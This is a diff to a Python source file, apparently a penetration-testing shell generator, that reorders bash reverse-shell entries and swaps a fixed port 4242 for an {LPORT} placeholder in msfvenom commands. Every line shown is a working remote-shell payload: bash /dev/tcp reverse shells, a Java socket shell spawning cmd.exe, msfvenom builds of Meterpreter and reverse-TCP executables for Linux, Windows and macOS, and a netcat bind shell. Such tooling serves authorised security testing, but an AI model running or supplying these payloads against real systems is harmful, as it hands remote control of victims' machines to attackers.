@@ -159,10 +159,10 @@ def add_shell(shells_dict, type, shell, notes=None):
 
 # Add shells to the main dictionnaries: revshells and bindshells
 def populate_shells():
-    add_shell(revshells, 'bash', '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''')
     add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ''')
-    add_shell(revshells, 'bash', '''/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1''')
     add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1' ''')
+    add_shell(revshells, 'bash', '''/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1''')
+    add_shell(revshells, 'bash', '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''')
     add_shell(revshells, 'bash', '''exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done''')
     add_shell(revshells, 'bash', '''exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0''')
     add_shell(revshells, 'bash', '''0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196''')
@@ -242,19 +242,19 @@ int port={LPORT};
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
     add_shell(shells_dict=revshells, type='groovy', notes='More stealthy', shell='''Thread.start {        // Reverse shell here        }''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT=4242 -f elf > shell.elf''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT=4242 -f exe > shell.exe''')
-    add_shell(revshells, 'meterpreter', '''msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT=4242 -f macho > shell.macho''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f elf > shell.elf''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f exe > shell.exe''')
+    add_shell(revshells, 'meterpreter', '''msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f macho > shell.macho''')
     add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f asp > shell.asp''')
     add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.jsp''')
     add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f war > shell.war''')
     add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_python LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.py''')
     add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_bash LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.sh''')
     add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_perl LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.pl''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Staged reverse TCP', shell='''msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT=4242 -f exe > reverse.exe''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Stageless reverse TCP', shell='''msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=4242 -f exe > reverse.exe''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Staged reverse TCP', shell='''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT=4242 -f elf >reverse.elf''')
-    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Stageless reverse TCP', shell='''msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT=4242 -f elf >reverse.elf''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Staged reverse TCP', shell='''msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Stageless reverse TCP', shell='''msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Staged reverse TCP', shell='''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
+    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Stageless reverse TCP', shell='''msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
 
     add_shell(bindshells, 'netcat', '''nc -lvp {LPORT} -e /bin/sh''')
 
